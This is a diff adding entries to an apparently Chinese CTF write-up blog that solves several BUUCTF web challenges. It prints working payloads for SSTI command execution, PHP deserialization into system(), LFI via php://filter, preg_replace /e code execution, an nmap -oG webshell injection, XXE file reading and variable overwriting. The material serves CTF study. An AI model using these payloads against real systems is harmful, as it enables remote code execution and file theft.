@@ -805,6 +805,213 @@ get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。有一点�
 </code></pre>
 <p>后面就是正常的sql注入，数字型的，<code>union</code>被过滤了,绕过方法是<code>union/**/select</code></p>
 <p>爆破出来是序列化字符串，把网页改成<code>file://var/www/html/flag.php</code>也可得到flag.php</p>
+<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>提示表明要使用xff，但是我没想到考的是ssti<br><img src="https://i0.hdslb.com/bfs/article/2cb3cba3e0da84fece9499656a30b99a290349942.png"><br>根据报错发现是smarty模板</p>
+<p><a href="https://www.freebuf.com/column/219913.html">参考</a></p>
+<p>没学，看wp发现可以直接命令执行</p>
+<pre><code>&#123;system(&#39;cat /flag&#39;)&#125;
+</code></pre>
+<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>点进去看抓包，发现第一个参数是函数名，第二个参数是传参，用file_get_contents获取index.php</p>
+<pre><code>func=file_get_contents&amp;p=index.php
+</code></pre>
+<p>获得源码</p>
+<pre><code>&lt;?php
+    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
+    function gettime($func, $p) &#123;
+        $result = call_user_func($func, $p);
+        $a= gettype($result);
+        if ($a == &quot;string&quot;) &#123;
+            return $result;
+        &#125; else &#123;return &quot;&quot;;&#125;
+    &#125;
+    class Test &#123;
+        var $p = &quot;Y-m-d h:i:s a&quot;;
+        var $func = &quot;date&quot;;
+        function __destruct() &#123;
+            if ($this-&gt;func != &quot;&quot;) &#123;
+                echo gettime($this-&gt;func, $this-&gt;p);
+            &#125;
+        &#125;
+    &#125;
+    $func = $_REQUEST[&quot;func&quot;];
+    $p = $_REQUEST[&quot;p&quot;];
+
+    if ($func != null) &#123;
+        $func = strtolower($func);
+        if (!in_array($func,$disable_fun)) &#123;
+            echo gettime($func, $p);
+        &#125;else &#123;
+            die(&quot;Hacker...&quot;);
+        &#125;
+    &#125;
+    ?&gt;
+</code></pre>
+<p>发现存在Test类，而且未过滤<code>unserialize</code>则可构造反序列化</p>
+<pre><code class="php">&lt;?php
+    class Test &#123;
+        var $p = &quot;Y-m-d h:i:s a&quot;;
+        var $func = &quot;date&quot;;
+        function __destruct() &#123;
+            if ($this-&gt;func != &quot;&quot;) &#123;
+                echo gettime($this-&gt;func, $this-&gt;p);
+            &#125;
+        &#125;
+    &#125;
+
+    $a = new Test();
+    // $a-&gt;p = &#39;ls ../../../&#39;;          ==&gt;  O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:12:&quot;ls ../../../&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
+    // $a -&gt; p = &quot;find / -name &#39;flag*&#39;&quot;;        ⇒  O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:20:&quot;find / -name &#39;flag*&#39;&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
+    $a -&gt; p = &#39;cat /tmp/flagoefiu4r93&#39;;     //  ==&gt;  O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
+    $a -&gt; func = &#39;system&#39;;
+
+    echo (serialize($a));
+
+    ?&gt;
+</code></pre>
+<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>一开始以为是sql注入，当输入<code>&#39;</code>发现报错，得到是用include包含，那首先想到的就是伪协议</p>
+<pre><code>http://51e6cadc-a1f6-40fc-a058-77625ad16e17.node5.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/resource=index.php
+</code></pre>
+<p>发现报错</p>
+<pre><code>
+Warning: include(php://filter/convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37
+</code></pre>
+<p>多了一个<code>.php</code>那么去除<code>.php</code>即可得到源码</p>
+<pre><code>&lt;?php
+                $file = $_GET[&#39;category&#39;];
+
+                if(isset($file))
+                &#123;
+                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
+                        include ($file . &#39;.php&#39;);
+                    &#125;
+                    else&#123;
+                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
+                    &#125;
+                &#125;
+                ?&gt;
+</code></pre>
+<p>那么就得有index,woofers,meowers中一个，可以套一层即可得payload</p>
+<pre><code>http://51e6cadc-a1f6-40fc-a058-77625ad16e17.node5.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/index/resource=flag
+</code></pre>
+<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>preg_replace &#x2F;e 模式下的代码执行问题</p>
+<pre><code class="php">function complex($re, $str) &#123;
+    return preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str);
+&#125;
+
+
+foreach($_GET as $re =&gt; $str) &#123;
+    echo complex($re, $str). &quot;\n&quot;;
+&#125;
+</code></pre>
+<p>preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 preg_replace 函数的第二个参数）当做代码来执行</p>
+<p>而这里面第二个参数含有<code>\1</code>那么他会将被匹配到的第 1 个捕获子组捕获到的文本替换,总之就是<code>\1</code>也被替换了，导致的命令执行<br>又因为特殊字符<code>.</code>会被替换成<code>_</code>所以我们这里传参是<code>\S*=</code>别问为啥是<code>\S</code>我不到啊</p>
+<pre><code>\S是什么意思？
+
+正则表达式\S匹配非空字符
+</code></pre>
+<p>payload ： <code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);</code></p>
+<p>什么要匹配到<code> &#123;$&#123;phpinfo()&#125;&#125;</code> 或者 <code>$&#123;phpinfo()&#125;</code> ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。<code> $&#123;phpinfo()&#125;</code> 中的 <code>phpinfo()</code> 会被当做变量先执行，执行后，即变成 <code>$&#123;1&#125;</code> (phpinfo()成功执行返回true)。</p>
+<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的</p>
+<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
+<p>反斜线（\）会在以下字符之前插入：&amp;#;&#96;|*?~&lt;&gt;^()[]{}$\、\x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 % 和 ! 字符前面都有一个插入符号（^）。</p>
+<p>它们组合使用时就会造成漏洞(顺序不能改变)，就借用一个大佬的例子，通俗易懂。</p>
+<pre><code>传入的参数是：172.17.0.2&#39; -v -d a=1
+经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
+经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
+最后执行的命令是curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#39;，即向172.17.0.2\发起请求，POST 数据为a=1&#39;。
+</code></pre>
+<p>也就是说，escapeshellcmd()函数转义了用于转义单引号的斜杠，导致这个单引号与后面的单引号形成了空白连接符就能执行命令了。</p>
+<h2 id="nmap构造命令"><a href="#nmap构造命令" class="headerlink" title="nmap构造命令"></a>nmap构造命令</h2><p>system函数里拼接了nmap的指令字符串。nmap中的-oG参数可以将代码与命令写到文件中，比如<code>nmap &lt;?php phpinfo();?&gt; -oG 1.php</code>，就是将这个<code>phpinfo()</code>;语句写在了1.php里内了。</p>
+<p>payload<br><code>?host=&#39; &lt;?php eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code>注意这里的空格</p>
+<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/124538469">抄的这篇文章</a></p>
+<p>一开始啥都没，最后用dirsearch扫出<code>.git</code>目录，所以是源码泄露</p>
+<p>得到源码后就是代码审计</p>
+<pre><code class="php">&lt;?php
+include &quot;flag.php&quot;;
+echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
+if (isset($_GET[&#39;exp&#39;])) &#123;
+    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;
+        if (&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;exp&#39;])) &#123;
+            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;
+                // echo $_GET[&#39;exp&#39;];
+                @eval($_GET[&#39;exp&#39;]);
+            &#125; else &#123;
+                die(&quot;还差一点哦！&quot;);
+            &#125;
+        &#125; else &#123;
+            die(&quot;再好好想想！&quot;);
+        &#125;
+    &#125; else &#123;
+        die(&quot;还想读flag，臭弟弟！&quot;);
+    &#125;
+&#125;
+// highlight_file(__FILE__);
+</code></pre>
+<p>其中<code>(?R)?</code> :<code>(?R)</code>代表当前表达式，就是这个<code>(/[a-z,_]+((?R)?)/)</code>，所以会一直递归，?表示递归当前表达式0次或1次（若是<code>(?R)*</code>则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）</p>
+<p>无参数REC 一般有三种绕过姿势：</p>
+<pre><code>gettallheaders（）
+get_defined_vars()
+session_id()
+</code></pre>
+<p>方法一：<br>payload</p>
+<pre><code>exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+</code></pre>
+<p>highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名<br>next() 输出数组中的当前元素和下一个元素的值。<br>array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)<br>scandir() 函数返回指定目录中的文件和目录的数组。<br>pos() 输出数组中的当前元素的值。<br>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是”.”。</p>
+<p>loacleconv 函数会固定返回一个 . 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件） rray_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将.过滤出去），最后用highlight_file()给显示出来。</p>
+<p>方法二：</p>
+<p>上面 的正则过滤中 其实并没有过滤掉 session_id()<br>所以我们可以使用 session_id来获取 flag<br>session_id() 可以用来获取&#x2F;设置 当前会话 ID。<br>在我们使用 session_id()的时候 需要使用session_start()来开启session会话<br>我们尝试构造payload</p>
+<pre><code>?exp=highlight_file( session_id(session_start()));
+</code></pre>
+<h1 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h1><p>xxe攻击<br>payload</p>
+<pre><code class="xml">&lt;!DOCTYPE user [
+&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;
+]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;
+&amp;xxe;&lt;/password&gt;&lt;/user&gt;
+</code></pre>
+<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>函数重载</p>
+<pre><code class="php">&lt;?php
+
+include &#39;flag.php&#39;;
+
+$yds = &quot;dog&quot;;
+$is = &quot;cat&quot;;
+$handsome = &#39;yds&#39;;
+
+foreach($_POST as $x =&gt; $y)&#123;
+    $$x = $y;
+&#125;
+
+foreach($_GET as $x =&gt; $y)&#123;
+    $$x = $$y;
+&#125;
+
+foreach($_GET as $x =&gt; $y)&#123;
+    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;
+        exit($handsome);
+    &#125;
+&#125;
+
+if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;
+    exit($yds);
+&#125;
+
+if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;
+    exit($is);
+&#125;
+
+
+
+echo &quot;the flag is: &quot;.$flag;
+</code></pre>
+<p><code>$$x = $$y;</code>存在函数重载,首先<code>flag=flag</code>会造成<code>$flag=$flag</code>,而后面的<code>is=flag</code>会照成<code>$is=$flag</code>,从而导致函数重载，通过<code>exit()</code>泄露出来</p>
+<p>payload</p>
+<pre><code>
+http://2680d063-6069-4766-9e84-8a35c77507cb.node5.buuoj.cn:81/index.php?flag=flag&amp;is=flag
+</code></pre>
+<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>twig ssti模板注入</p>
+<p>具体可看<a href="">ctf-ssti模板注入</a><br>payload</p>
+<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;
+</code></pre>
 
         </div>
         <!-- .entry-content -->
